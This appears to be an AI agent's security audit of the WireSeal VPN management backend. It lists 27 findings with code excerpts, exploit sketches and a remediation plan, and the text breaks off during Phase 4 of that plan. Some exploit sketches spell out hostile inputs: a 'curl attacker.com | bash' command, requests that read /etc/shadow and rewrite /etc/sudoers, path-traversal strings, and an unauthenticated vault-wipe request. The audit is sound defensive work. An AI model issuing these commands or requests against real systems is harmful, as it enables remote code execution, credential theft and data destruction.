# WireSeal Security Audit — 2026-04-18

Auditor: security-reviewer agent  
Scope: Full codebase — Python backend, TypeScript dashboard, installer scripts  
Threat model: local unprivileged attacker on same box, malicious WireGuard peer config, compromised browser tab reaching 127.0.0.1

---

## Part 1 — Findings

---

### SEC-001 — Audit log endpoint lacks authentication
**Severity:** HIGH  
**CIA pillars:** Confidentiality, Integrity  
**Location:** `src/wireseal/api.py` lines 1682–1695

```python
def _h_audit_log(req: "_Handler", _groups: tuple) -> dict:
    if not _AUDIT_PATH.exists():
        return {"entries": []}
    try:
        text    = _AUDIT_PATH.read_text()
```

**Exploit sketch:** Every other sensitive GET endpoint calls `_require_unlocked()` first. `_h_audit_log` does not. Any process on the machine — or a browser tab at `http://127.0.0.1:8080/api/audit-log` — can retrieve the last 100 audit log entries without knowing the vault passphrase. The entries expose admin IDs, client names, IP addresses, unlock timestamps, operation history, and error messages, all without authentication.

**Why it matters:** The audit log is the primary record of who did what and when. Exposing it unauthenticated leaks the full operational picture (admin identities, network topology, key rotation timing) to any process on the machine or a CSRF-capable web page.

---

### SEC-002 — `POST /api/fresh-start` destroys vault without authentication
**Severity:** CRITICAL  
**CIA pillars:** Integrity, Availability  
**Location:** `src/wireseal/api.py` lines 2054–2095

```python
def _h_fresh_start(req: "_Handler", _groups: tuple) -> dict:
    # NOTE: deliberately NOT requiring unlock — fresh start must work when
    # the user has forgotten their passphrase or the vault is corrupt.
    body = req._json()
    if body.get("confirm") != "CONFIRM":
        raise _ApiError('Send {"confirm":"CONFIRM"} to proceed.', 400)
```

**Exploit sketch:** `_h_fresh_start` accepts any POST to `http://127.0.0.1:8080/api/fresh-start` with body `{"confirm":"CONFIRM"}` and immediately calls `shutil.rmtree(_VAULT_DIR)`, deleting the vault, all client configs, and the PIN file. No passphrase, no session, no CSRF token required. A malicious web page running in any browser on the same machine can issue this request using a cross-origin XMLHttpRequest — the CORS policy checks `Origin` but `_cors()` only calls `send_header`, it does not reject the request before the handler executes. The handler runs, deletes the vault, and returns `{"ok": true}` before the browser even sees the CORS response.

**Why it matters:** An unprivileged local process or a compromised browser tab can permanently destroy the vault and all WireGuard configurations with a single HTTP request. Recovery requires full reinitialisation and key redistribution to all peers.

---

### SEC-003 — CORS check does not enforce same-origin; dangerous operations are CSRF-vulnerable
**Severity:** HIGH  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 4007–4024

```python
def _cors(self) -> None:
    origin = self.headers.get("Origin", "")
    _allowed = {"http://127.0.0.1", "http://localhost"}
    ...
    if any(origin == a or origin.startswith(a + ":") for a in _allowed):
        self.send_header("Access-Control-Allow-Origin", origin)
    # No header at all for unknown origins — browser will block.
```

**Exploit sketch:** `_cors()` is an *after-the-fact* CORS response header setter. It does not reject requests before the handler executes. The handler runs unconditionally; `_cors()` is called inside `_send()` which fires after the handler returns a result. For `fresh-start` (SEC-002), `add-client`, `terminate`, and `change-passphrase`, the state-changing operation completes before any CORS header is evaluated. A `<form action="http://127.0.0.1:8080/api/fresh-start" method="POST">` or a `fetch()` from a non-127.0.0.1 origin will be blocked by the browser's CSRF response filtering but the server has already executed the action. Additionally, there is no `SameSite` cookie enforcement (no cookies used at all) and no CSRF token on any route. Simple cross-origin form POST to `fresh-start` with `application/x-www-form-urlencoded` body will be blocked by browser CORS but preflighted `application/json` requests from `http://localhost` (an allowed origin) are fully accessible.

**Why it matters:** Any page served from `http://localhost` (e.g., another local web app, a VS Code extension host, a dev server) can perform all authenticated vault operations as long as the vault is unlocked.

---

### SEC-004 — Unbounded `Content-Length` read — request body DoS
**Severity:** HIGH  
**CIA pillars:** Availability  
**Location:** `src/wireseal/api.py` lines 4026–4031

```python
def _json(self) -> dict:
    length = int(self.headers.get("Content-Length", 0))
    if length == 0:
        return {}
    try:
        return json.loads(self.rfile.read(length))
```

**Exploit sketch:** There is no upper bound on `Content-Length`. An attacker sends `POST /api/unlock` with `Content-Length: 4294967295` (4 GiB). The server calls `self.rfile.read(4294967295)` on each request thread. `ThreadingHTTPServer` spawns a new thread per request; three concurrent requests exhaust available RAM. Because `_check_rate_limit` is called *before* `_json()` in `_h_unlock`, rate-limiting does not prevent this for non-rate-limited endpoints (e.g., `/api/fresh-start`, `/api/vault-info`, `/api/dns`, `/api/backup/config`).

**Why it matters:** Any local process can crash the API server, which prevents all vault management until the service is restarted.

---

### SEC-005 — Auto-update installs downloaded binary without signature verification
**Severity:** CRITICAL  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 3551–3659

```python
with urllib.request.urlopen(dl_req, timeout=120) as resp:
    with open(tmp_path, "wb") as f:
        while True:
            chunk = resp.read(65536)
            ...
# ... later:
tar.extractall(tmp_dir)   # CVE-class path traversal possible
os.rename(current_exe + ".new", current_exe)
```

**Exploit sketch (two vectors):**

1. **No signature check.** The downloader fetches the asset from `asset_url` returned by the GitHub API, then immediately executes it (Windows) or replaces `sys.executable` (Linux/macOS). There is no SHA-256/sigstore/cosign verification against a pinned public key before execution. A GitHub account compromise, a DNS poisoning attack, or a MITM on the GitHub API response (asset URL is attacker-controlled JSON) results in arbitrary code execution as root.

2. **tarfile path traversal (CVE-class).** `tar.extractall(tmp_dir)` on both Linux and macOS is called with no filter argument. Python 3.12 emits a `DeprecationWarning` for this; Python 3.14 may change the default. A malicious archive containing members with `../` paths (e.g., `../../etc/cron.d/evil`) can escape `tmp_dir` and write to arbitrary filesystem locations as root.

**Why it matters:** Arbitrary code execution as root on all supported platforms. Complete host compromise.

---

### SEC-006 — `_verify_root_password` grants admin mode to already-root process with empty password
**Severity:** HIGH  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 230–250

```python
def _verify_root_password(password: str) -> bool:
    if sys.platform == "win32":
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    if os.geteuid() == 0:
        return True  # Already root — no password needed
```

**Exploit sketch:** WireSeal normally runs as root (the README and privilege checks require it). When `euid == 0`, `_verify_root_password` returns `True` for any password string, including an empty string. Any caller who can POST `{"password":""}` to `/api/admin/authenticate` while the vault is unlocked immediately gets 30-minute admin mode with unrestricted `admin/exec`, `admin/file/read`, and `admin/file/write` access. On Windows, `IsUserAnAdmin()` is checked once at call time — any elevated process qualifies. The vault does need to be unlocked first (vault passphrase must be known), but the admin mode escalation then requires zero credentials.

**Why it matters:** `POST /api/admin/exec` with `{"cmd":["cat","/etc/shadow"]}` becomes trivially exploitable once the vault is unlocked.

---

### SEC-007 — `_h_admin_exec` accepts arbitrary commands without allowlist
**Severity:** CRITICAL  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 2321–2364

```python
cmd  = body.get("cmd", [])
if not cmd or not isinstance(cmd, list):
    raise _ApiError("cmd (array of strings) is required", 400)
if not all(isinstance(s, str) for s in cmd):
    raise _ApiError("cmd must be an array of strings", 400)
...
result = _admin_run(cmd, ...)
```

**Exploit sketch:** Once admin mode is active (see SEC-006), any string array is accepted as `cmd`. No allowlist, no path restriction, no argument validation. The attacker can run `["bash", "-c", "curl attacker.com | bash"]`, `["python3", "-c", "import os; os.system(...)"]`, or exfiltrate `/etc/shadow`, WireGuard private keys, or the vault file. The audit log records only `cmd[:3]` (the first 3 elements), so long payloads are not fully logged.

**Why it matters:** This is an intentional feature (shell access), but combined with SEC-006 (empty password accepted when already root) it becomes a zero-credential full-system backdoor accessible to any code that can reach `127.0.0.1:8080` with the vault unlocked.

---

### SEC-008 — `_h_admin_read_file` / `_h_admin_write_file` — no path restriction
**Severity:** CRITICAL  
**CIA pillars:** Confidentiality, Integrity  
**Location:** `src/wireseal/api.py` lines 2456–2522

```python
path = body.get("path", "").strip()
if not path:
    raise _ApiError("path is required", 400)
result = _admin_run(["cat", "--", path], timeout=10)   # read
result = _admin_run(["tee", "--", path], ...)           # write
```

**Exploit sketch:** No path validation beyond non-empty string. With admin mode active, POST `{"path": "/etc/shadow"}` reads the shadow password file. POST `{"path": "/etc/sudoers", "content": "ALL=(ALL) NOPASSWD: ALL"}` writes arbitrary content to any root-owned file. The `--` separator prevents shell argument injection but does not prevent reading or overwriting sensitive system files.

**Why it matters:** Credentials theft and persistent privilege escalation.

---

### SEC-009 — Backup path traversal in restore endpoint
**Severity:** HIGH  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 3430–3473; `src/wireseal/backup/manager.py` lines 151–189

```python
backup_path = body.get("backup_path", "")
...
_backup_manager.restore_backup(backup_path, vault_path, passphrase_ba, ...)
# In manager.py:
backup_vault_path = Path(src_path)
if not backup_vault_path.exists():
    raise FileNotFoundError(...)
test_vault = Vault(backup_vault_path)
with test_vault.open(passphrase, admin_id=admin_id): pass
# Phase 2: atomic replace
shutil.copy2(backup_vault_path, tmp)
os.replace(tmp, vault_path)
```

**Exploit sketch:** `backup_path` accepts any filesystem path without restriction. An attacker supplies `{"backup_path": "/dev/stdin", "passphrase": "..."}` or any other file path. If the supplied passphrase happens to decrypt that file (very unlikely but not impossible for structured data), the live vault is silently replaced. More practically, `backup_path` pointing to a symlink or `/proc/self/mem` could cause unexpected behaviour. The primary vector is a path pointing to an attacker-controlled file that the attacker has pre-crafted to decrypt with a known passphrase, allowing complete vault replacement.

**Why it matters:** The live vault — containing all WireGuard private keys and peer configurations — can be replaced with attacker-controlled content, enabling traffic interception across all VPN clients.

---

### SEC-010 — tarfile extraction without filter in auto-update (path traversal)
**Severity:** HIGH  
**CIA pillars:** Integrity  
**Location:** `src/wireseal/api.py` lines 3608–3650

```python
with tarfile.open(tmp_path, "r:gz") as tar:
    tar.extractall(tmp_dir)
```

This is the specific tarfile path traversal vector within SEC-005. Called twice (Linux and macOS). Listed separately because it is independently exploitable if the GitHub release asset is compromised or if the download URL is MITM'd.

---

### SEC-011 — `wipe_string` is ineffective for non-ASCII passphrases and multi-interpreter use
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/security/secrets_wipe.py` lines 39–58

```python
def wipe_string(s: str) -> None:
    length = len(s)
    header_size = sys.getsizeof(s) - length
    ctypes.memset(id(s) + header_size, 0, length)
```

**Exploit sketch:** For non-ASCII (multi-byte) passphrases, `sys.getsizeof(s) - len(s)` does not correctly calculate the buffer offset. Python's `len()` returns character count; the internal UTF-8 buffer may be longer. The `ctypes.memset` zeros only `len(s)` bytes, leaving the remainder of the passphrase in memory. For interned strings (e.g., short passphrases that Python may intern), the wipe would corrupt the interpreter's string table. This is a documented CPython implementation detail that is not guaranteed to work across Python versions. On Python 3.14 (which this project targets per `requirements.txt`), the compact-ASCII object layout may differ.

**Why it matters:** Passphrase material lingers in memory after `wipe_string` is called, making it visible to a `/proc/$pid/mem` read or a core dump.

---

### SEC-012 — `bytes(secret)` in `SecretBytes.__bytes__` creates unwipeable copy
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/security/secret_types.py` lines 143–145

```python
def __bytes__(self) -> bytes:
    """Return content as immutable bytes. Caller is responsible for any necessary wiping."""
    return bytes(self._data)
```

**Exploit sketch:** `bytes(secret)` is called implicitly anywhere `bytes(some_secret_bytes_instance)` appears. The returned `bytes` object is immutable and cannot be wiped. If this copy ends up in a local frame, a Python traceback, or a log handler before `wipe()` is called on the original, the key material is permanently in memory. A core dump or `/proc/self/mem` read after an exception reveals it. The comment warns callers but there is no enforcement.

**Why it matters:** Key material leaks into immutable memory regions after any code path that calls `bytes(secret)` implicitly.

---

### SEC-013 — `_h_unlock` and `_h_totp_verify_backup` accept arbitrary `admin_id`
**Severity:** MEDIUM  
**CIA pillars:** Integrity, Confidentiality  
**Location:** `src/wireseal/api.py` lines 918–986; lines 3187–3256

```python
admin_id = body.get("admin_id", "owner")
...
vault = Vault(_VAULT_PATH)
with vault.open(passphrase, admin_id=admin_id) as st:
    admins_dict = st.data.setdefault("admins", {})
    if admin_id in admins_dict:
        admins_dict[admin_id]["last_unlock"] = _utcnow_iso()
    admin_role = admins_dict.get(admin_id, {}).get("role", "owner")
```

**Exploit sketch:** `admin_id` is not validated against any allowlist pattern. An attacker supplies an `admin_id` with special characters — e.g., `../`, `\x00`, or JSON-breaking characters. While the current use of `admin_id` as a dict key is safe from injection, if `admin_id` is not present in `admins_dict`, the code falls back to `"owner"` role via `.get(admin_id, {}).get("role", "owner")`. This means an attacker who can decrypt the vault with the correct passphrase but provides a non-existent `admin_id` is assigned `"owner"` role silently.

**Why it matters:** An attacker with a valid passphrase but a fabricated `admin_id` that does not exist in the vault gets owner role, bypassing the explicit role assigned to their actual keyslot.

---

### SEC-014 — PIN unlock does not check client IP rate limit before decrypting the passphrase
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/api.py` lines 2161–2228

```python
def _h_unlock_pin(req: "_Handler", _groups: tuple) -> dict:
    global _pin_fail_count
    client_ip = req.client_address[0]
    _check_rate_limit(client_ip)      # Uses _unlock_attempts (passphrase rate limiter)
    ...
    with _lock:
        if _pin_fail_count >= _PIN_MAX_ATTEMPTS:
            _pin_wipe()
            _pin_fail_count = 0
            raise _ApiError(...)
```

**Exploit sketch:** The `_pin_fail_count` is a module-level global (not per-IP). Multiple concurrent threads from different IPs share the same counter. Thread 1 makes 4 failed PIN attempts from IP-A (counter = 4). Thread 2 from IP-B gets 1 attempt before the counter rolls over to 5 and wipes the PIN. Additionally, after the PIN file is wiped and `_pin_fail_count` reset to 0, the same attacker can immediately retry 5 more times. The `_check_rate_limit` at the top limits passphrase failures, but PIN failures are tracked separately in a global counter without IP binding.

**Why it matters:** Concurrent PIN brute-force from multiple sources can exhaust the attempt limit while evading per-IP tracking, or conversely, one attacker's failures can cause PIN wipe for legitimate users (availability).

---

### SEC-015 — Heartbeat endpoint has no authentication; any process can reset client TTLs
**Severity:** MEDIUM  
**CIA pillars:** Integrity, Availability  
**Location:** `src/wireseal/api.py` lines 1222–1272

```python
def _h_heartbeat(req: "_Handler", groups: tuple) -> dict:
    """Reset TTL for a client. Rate-limited to 1 reset per 30s per client.
    No vault unlock required — clients call this directly.
    """
    name = groups[0]
    ...
    if vault is None:
        raise _ApiError("Server vault is locked.", 503)
    client = cache.get("clients", {}).get(name)
```

**Exploit sketch:** Any process on the machine (or browser tab) can POST to `/api/heartbeat/<client_name>` without authentication and reset the TTL for any client name it knows. Client names are visible in the audit log (SEC-001 makes this unauthenticated). An attacker can keep clients with short TTLs alive indefinitely, preventing ZTNA revocation from taking effect.

**Why it matters:** ZTNA TTL-based access control — a core security feature — is bypassed by any local process.

---

### SEC-016 — `_h_init` rate limit bypass: multiple vaults can be created by racing
**Severity:** LOW  
**CIA pillars:** Availability  
**Location:** `src/wireseal/api.py` lines 698–703

```python
def _h_init(req: "_Handler", _groups: tuple) -> dict:
    if _VAULT_PATH.exists():
        raise _ApiError("Vault already exists. Use /api/unlock.", 409)
    ...
    vault = Vault.create(_VAULT_PATH, passphrase, initial_state)
```

**Exploit sketch:** Two concurrent `POST /api/init` requests can both pass the `_VAULT_PATH.exists()` check before either creates the file (TOCTOU race). `Vault.create` uses an atomic write under a file lock, but the existence check and the create are not atomic. In the race, both calls proceed and the second `Vault.create` overwrites the first, silently discarding the first passphrase. The first caller now holds a session with a passphrase that no longer decrypts the vault.

**Why it matters:** Low-severity race condition. Realistically only triggerable under scripted concurrent load, not a meaningful attack surface.

---

### SEC-017 — `_h_backup_config_set` stores `webdav_pass` in plaintext inside the encrypted vault
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/api.py` lines 3362–3380

```python
allowed_keys = {
    ..., "webdav_pass", ...
}
...
for k, v in body.items():
    if k in allowed_keys:
        cfg[k] = v
```

**Exploit sketch:** `webdav_pass` is stored as a plain string inside `state.data["backup_config"]`. While the vault itself is encrypted, once the vault is unlocked the password is held in plaintext in `_session["cache"]`. The `_h_backup_config_get` endpoint strips `webdav_pass` from the response (correct), but the password is present in the decrypted in-memory state. A core dump, a Python exception traceback, or a debug print will expose it. There is also no separate treatment of this field in `VaultState._wrap_secrets` (which only wraps fields ending in `_key` or named `psk`).

**Why it matters:** WebDAV credentials are stored as plain strings alongside crypto keys. A memory forensics analysis of a running process exposes them.

---

### SEC-018 — Auto-update `_h_update_install` is not protected by vault unlock or admin mode
**Severity:** HIGH  
**CIA pillars:** Integrity  
**Location:** `src/wireseal/api.py` — route table line 3984

```python
("POST",   re.compile(r"^/api/update/install$"),        _h_update_install),
```

No `_require_unlocked()` or `_require_admin_active()` call is present in `_h_update_install`. Any unauthenticated POST to `/api/update/install` from any process on the machine triggers a download and install of the latest release.

**Why it matters:** An unauthenticated trigger of a root-level binary replacement that already lacks signature verification (SEC-005) is a compounding CRITICAL risk.

---

### SEC-019 — Argon2id parameters in vault header are trusted on decrypt without upper-bound validation
**Severity:** MEDIUM  
**CIA pillars:** Availability, Integrity  
**Location:** `src/wireseal/security/vault.py` lines 483–508

```python
memory_cost, time_cost, parallelism = ... = _HEADER_STRUCT.unpack(blob[:_HEADER_SIZE])
...
master_key = _derive_master_key(passphrase, salt,
                                memory_cost=memory_cost,
                                time_cost=time_cost,
                                parallelism=parallelism)
```

**Exploit sketch:** The Argon2id parameters are read directly from the vault header (which is unauthenticated for a v2 vault before GCM tag verification). An attacker who can write to the vault file replaces `memory_cost` with `0xFFFFFFFF` (4 TiB) before the GCM tag is verified. The server attempts to allocate 4 TiB of RAM, triggering OOM. The GCM tag check only happens inside `_decrypt_payload`, which is called *after* `_derive_master_key`. For v2 vaults, the header is not part of the AEAD AAD in the key derivation step; it is used as AAD for the cipher layers but the Argon2 parameters are consumed before authentication.

**Why it matters:** A local attacker who can write to `~/.wireseal/vault.enc` can cause an OOM crash on the next unlock attempt without breaking the cipher.

---

### SEC-020 — `_h_client_get_config` exposes full WireGuard private key via API
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/api.py` lines 3724–3741

```python
def _h_client_get_config(req: "_Handler", groups: tuple) -> dict:
    _require_unlocked()
    ...
    with vault.open(passphrase) as state:
        config = get_config(state._data, name)
    return config
```

The `get_config` call returns the full config dict from `client_configs`, which includes the raw WireGuard `[Interface]` block containing `PrivateKey`. This is returned as JSON, placed in browser memory, and potentially in browser history/cache.

**Why it matters:** A browser tab that has the vault unlocked, or any subsequent JavaScript code with access to the response, receives the WireGuard private key in plaintext JSON.

---

### SEC-021 — SSH password stored plaintext in `SshTicket` and logged (partial)
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/ssh/session_manager.py` lines 28–45

```python
@dataclass
class SshTicket:
    password: Optional[str]  # Plaintext here is acceptable — ticket is single-use + short-lived
```

**Exploit sketch:** The SSH password is stored as a plain `str` in an `SshTicket` dataclass with no wiping mechanism. `SshTicket` instances live in `_tickets` dict for up to 60 seconds and in `_active_sessions` thereafter. Python dataclasses are not protected from `repr()`, `vars()`, or inspection. A Python exception during session setup could expose the password in a traceback. The comment says "acceptable" but the session can be leaked into the audit log or a crash report.

**Why it matters:** SSH credentials for internal hosts (reachable only over VPN) are at risk of exposure via crash reports, exception logs, or core dumps.

---

### SEC-022 — Static file serving lacks path traversal protection
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/api.py` lines 4064–4099

```python
def _serve_static(self, path: str) -> None:
    dist = _get_dist_dir()
    rel = path.lstrip("/")
    file_path = (dist / rel) if rel else (dist / "index.html")
    if not file_path.exists() or file_path.is_dir():
        file_path = dist / "index.html"
    ...
    data = file_path.read_bytes()
```

**Exploit sketch:** `path.lstrip("/")` strips leading slashes but does not resolve symlinks or reject `../`. A request for `GET /../../etc/passwd` strips the leading `/` to `../../etc/passwd`, which `Path(dist) / "../../etc/passwd"` resolves outside the `dist` directory. The SPA fallback only triggers if the resolved path does not exist — if the target file exists, it is served. `Path.__truediv__` does resolve `..` components in the final path string but the critical question is whether `dist.parent.parent / "etc/passwd"` resolves to an existing file. Since `dist` is typically 3 levels deep from the repo root, `../../etc/passwd` from inside `dist` would be the repo's own `etc/passwd` (which does not exist). On the real system with `_MEIPASS`, the path would resolve inside the bundle directory. However, symbolic links inside `dist/` are not checked — a symlink inside the dashboard bundle pointing outside the bundle is followed.

**Why it matters:** Symlink-based path traversal through the static file server could expose arbitrary files from the bundled application directory.

---

### SEC-023 — `_pin_fail_count` is not protected against concurrent access (TOCTOU)
**Severity:** MEDIUM  
**CIA pillars:** Confidentiality  
**Location:** `src/wireseal/api.py` lines 2161–2228

```python
with _lock:
    if _pin_fail_count >= _PIN_MAX_ATTEMPTS:
        _pin_wipe()
        _pin_fail_count = 0
        raise _ApiError(...)
...
passphrase_bytes = _pin_load(pin)
if passphrase_bytes is None:
    with _lock:
        _pin_fail_count += 1   # <-- separate lock acquisition
```

**Exploit sketch:** The check (`_pin_fail_count >= 5`) and the increment (`_pin_fail_count += 1`) are in two separate lock acquisitions with the PIN decryption attempt between them. Two concurrent threads can both pass the initial check (count = 4), both fail PIN decryption, and both increment the counter: result is `_pin_fail_count = 6` without the wipe firing correctly. The wipe fires on the next call. This is a benign race for availability but demonstrates the non-atomic check-then-act pattern.

---

### SEC-024 — `_h_remove_pin` does not require vault to be unlocked
**Severity:** LOW  
**CIA pillars:** Availability  
**Location:** `src/wireseal/api.py` lines 2153–2158

```python
def _h_remove_pin(req: "_Handler", _groups: tuple) -> dict:
    """Remove the quick-unlock PIN."""
    _pin_wipe()
    ...
    return {"ok": True}
```

No `_require_unlocked()` call. Any unauthenticated request to `POST /api/remove-pin` deletes the PIN file. This is a denial-of-service: the legitimate user must then use the full passphrase.

---

### SEC-025 — Audit log lacks tamper evidence (no hash chaining)
**Severity:** MEDIUM  
**CIA pillars:** Integrity  
**Location:** `src/wireseal/security/audit.py` lines 254–308

The audit log is append-only JSON but has no cryptographic tamper evidence. There is no hash chaining, HMAC, or signature covering previous entries. A local attacker with write access to `~/.wireseal/audit.log` can truncate the file, delete specific lines, or insert fabricated entries. The `get_recent_entries` parser silently ignores lines that fail JSON parsing.

**Why it matters:** Security events (unauthorized unlock attempts, key rotations, admin changes) can be silently erased by any process that can write to the audit directory, which runs as root and has world-readable audit log permissions of 640 (group-readable).

---

### SEC-026 — `_h_update_check` phones home to GitHub without authentication required
**Severity:** LOW  
**CIA pillars:** Confidentiality (privacy)  
**Location:** `src/wireseal/api.py` lines 3503–3548

```python
def _h_update_check(req: "_Handler", _groups: tuple) -> dict:
    """Check GitHub for the latest release. No auth required."""
    import urllib.request
    ...
    gh_req = urllib.request.Request(_GITHUB_API_LATEST, ...)
    with urllib.request.urlopen(gh_req, timeout=15) as resp:
```

No `_require_unlocked()`. Any process can trigger a GitHub API call via `GET /api/update/check`. The `User-Agent: WireSeal-Updater` header exposes the application identity to GitHub (and any network intermediary) on demand without user consent.

---

### SEC-027 — Backup local path is not restricted to safe directories
**Severity:** MEDIUM  
**CIA pillars:** Integrity  
**Location:** `src/wireseal/backup/manager.py` lines 90–103

```python
def _create_local(self, vault_path, cfg, fname):
    local_path = cfg.get("local_path")
    dest_dir = Path(local_path)
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest_file = dest_dir / fname
    shutil.copy2(vault_path, dest_file)
```

No path validation on `local_path`. An attacker who can set `backup_config.local_path` (requires vault unlock) to `/etc/cron.hourly/` and then trigger a backup will write the encrypted vault file (named `vault_YYYYMMDD_HHMMSS.enc`) to the cron directory. The file is not executable and has no valid cron syntax, so it will not execute; however, path traversal to sensitive directories is unrestricted.

---

## Part 2 — Remediation Plan

---

### Phase 1 — Stop the bleeding (CRITICAL + most impactful HIGH) — Week 1

**Closes:** SEC-002, SEC-005, SEC-007, SEC-008, SEC-018

**SEC-002: fresh-start without auth**
- File: `src/wireseal/api.py`
- Add a per-session CSRF token (a random 32-byte token generated at server start, returned only via the authenticated `/api/vault-info` response) and validate it on `fresh-start`, OR require vault unlock AND a second factor (e.g., admin_id + passphrase confirmation).
- At minimum, add `_require_unlocked()` and require the vault passphrase to be re-submitted in the body.
- Tests: POST fresh-start without session → 401; POST with wrong confirm string → 400; POST with correct session + confirm → 200.

**SEC-005 / SEC-010: auto-update without signature verification + tarfile path traversal**
- Files: `src/wireseal/api.py`, new `src/wireseal/security/update_verifier.py`
- Download a detached `.sha256` or cosign `.sig` file alongside the release asset. Verify hash/signature before execution.
- Replace `tar.extractall(tmp_dir)` with `tar.extractall(tmp_dir, filter="data")` (Python 3.12+ safe filter, rejects absolute paths and `..` traversal).
- Tests: tampered archive rejected; unsigned asset rejected; valid signed asset accepted.

**SEC-007 / SEC-008: admin/exec and admin/file/* without allowlist**
- File: `src/wireseal/api.py`
- Introduce a strict allowlist of permitted commands for `admin/exec` (or remove the endpoint entirely; it serves no purpose the other endpoints don't already cover).
- For `admin/file/read` and `admin/file/write`, restrict `path` to a configurable list of allowed directories (e.g., `/etc/wireguard/`, `/etc/nftables.d/`). Reject paths containing `..`.
- Tests: disallowed command → 403; path outside whitelist → 403; allowed path → 200.

**SEC-018: update/install without auth**
- File: `src/wireseal/api.py`
- Add `_require_unlocked()` AND `_require_admin_active()` before the update install handler body.
- Tests: unauthenticated POST → 401; authenticated POST → proceeds.

---

### Phase 2 — Auth hardening and DoS prevention — Week 2

**Closes:** SEC-001, SEC-003, SEC-004, SEC-006, SEC-024, SEC-026

**SEC-001: audit log without auth**
- File: `src/wireseal/api.py`
- Add `_require_unlocked()` to `_h_audit_log`.
- Tests: unauthenticated GET → 401; authenticated GET → 200.

**SEC-003: CSRF / CORS enforcement**
- File: `src/wireseal/api.py`
- Generate a per-server-start CSRF token (`secrets.token_hex(32)`). Return it in `GET /api/vault-info`. Require it as a custom header (`X-WireSeal-CSRF`) on all state-changing requests (POST, DELETE). Validate this header in `_dispatch` before calling handlers.
- Reject requests with invalid or missing token with 403.
- Tests: POST without CSRF header → 403; POST with wrong token → 403; POST with correct token → 200.

**SEC-004: unbounded body read**
- File: `src/wireseal/api.py` in `_json()`
- Cap `Content-Length` at a reasonable maximum (e.g., 1 MiB = 1048576). If `length > MAX_BODY_SIZE`, return 413 immediately without reading.
- Tests: POST with Content-Length 2 MiB → 413; POST with large body without Content-Length → handled gracefully.

**SEC-006: admin auth with empty password when already root**
- File: `src/wireseal/api.py`
- On Unix, always validate the password via `sudo -k -S true` regardless of `euid`. If already root, require an explicit configuration flag or a vault-derived secret to activate admin mode rather than accepting empty password.
- On Windows, require the vault passphrase as a second factor for admin activation.
- Tests: empty password when root → 401; correct password → 200.

**SEC-024: remove-pin without auth**
- File: `src/wireseal/api.py`
- Add `_require_unlocked()` to `_h_remove_pin`.
- Tests: unauthenticated POST → 401; authenticated POST → 200.

**SEC-026: update-check phones home without auth**
- File: `src/wireseal/api.py`
- Add `_require_unlocked()` to `_h_update_check`.
- Tests: unauthenticated GET → 401.

---

### Phase 3 — Memory safety and secrets hygiene — Week 3

**Closes:** SEC-011, SEC-012, SEC-013, SEC-017, SEC-021

**SEC-011: wipe_string ineffective for multi-byte**
- File: `src/wireseal/security/secrets_wipe.py`
- Detect non-ASCII strings and use `ctypes.memmove` with the correct buffer size derived from `sys.getsizeof(s)` or refuse to process non-ASCII (passphrases are ASCII-safe in practice).
- Add a unit test asserting the buffer is zeroed after wipe for both ASCII and Latin-1 inputs.

**SEC-012: bytes(secret) creates unwipeable copy**
- File: `src/wireseal/security/secret_types.py`
- Deprecate `__bytes__`. Replace callers with `expose_secret()` + explicit bytearray handling. Add a `__bytes__` override that raises `TypeError` with a clear message guiding callers to use `expose_secret()`.
- Audit all call sites with `grep -r 'bytes(.*secret\|bytes(.*pass'`.

**SEC-013: arbitrary admin_id grants owner role**
- File: `src/wireseal/api.py`
- Validate `admin_id` against the pattern `^[a-zA-Z0-9_-]{1,64}$` before use. After vault decryption, confirm `admin_id` exists in `admins_dict`; if not, fail with `VaultUnlockError` rather than silently defaulting to "owner".
- Tests: non-existent admin_id with valid passphrase → 401; valid admin_id → 200.

**SEC-017: webdav_pass in plaintext in cache**
- File: `src/wireseal/security/vault.py` (`VaultState._wrap_secrets`)
- Extend the secret-wrapping logic to include fields matching `*_pass` in addition to `*_key` and `psk`. Wrap `webdav_pass` in `SecretBytes` when loaded into `VaultState`.
- Tests: after vault unlock, `webdav_pass` field is a `SecretBytes` instance, not a plain string.

**SEC-021: SSH password in plaintext SshTicket**
- File: `src/wireseal/ssh/session_manager.py`
- Replace `password: Optional[str]` with `password: Optional[SecretBytes]`. Wrap password on `issue_ticket`. Call `wipe()` in `SshSessionManager._prune_expired` and when the ticket is consumed.
- Tests: after ticket expiry, password field is wiped.

---

### Phase 4 — Path safety, integrity, and availability — Week 4

**Closes:** SEC-009, SEC-014, SEC-015, SEC-019, SEC-022, SEC-023, SEC-025, SEC-027

**SEC-009: backup path traversal**
- File: `src/wireseal/backup/manager.py`
- Resolve `Path(src_path).resolve()` and confirm it is within an allowed directory (e.g., the configured `local_path` backup directory or a set of user-configurable paths). Reject paths outside the allowlist.
- Tests: path outside backup dir → ValueError; valid path → proceeds.

**SEC-014: PIN fail counter not per-IP**
- File: `src/wireseal/api.py`
- Replace the global `_pin_fail_count` with a per-IP dict (like `_unlock_attempts`). Merge the PIN failure tracking with `_record_unlock_failure` so a single unified rate limiter covers both passphrase and PIN attempts per IP.
- Tests: concurrent PIN failures from different IPs are tracked independently.

**SEC-015: heartbeat without auth**
- File: `src/wireseal/api.py`
- Two options: (a) require the client to present a per-client bearer token issued at client-add time and verified server-side, or (b) make heartbeat server-internal only (clients ping WireGuard, server detects via handshake). Option (b) aligns with the existing peer-connected audit logic.
- Tests: unauthenticated heartbeat → 401.

**SEC-019: Argon2 params from header without upper bound**
- File: `src/wireseal/security/vault.py`
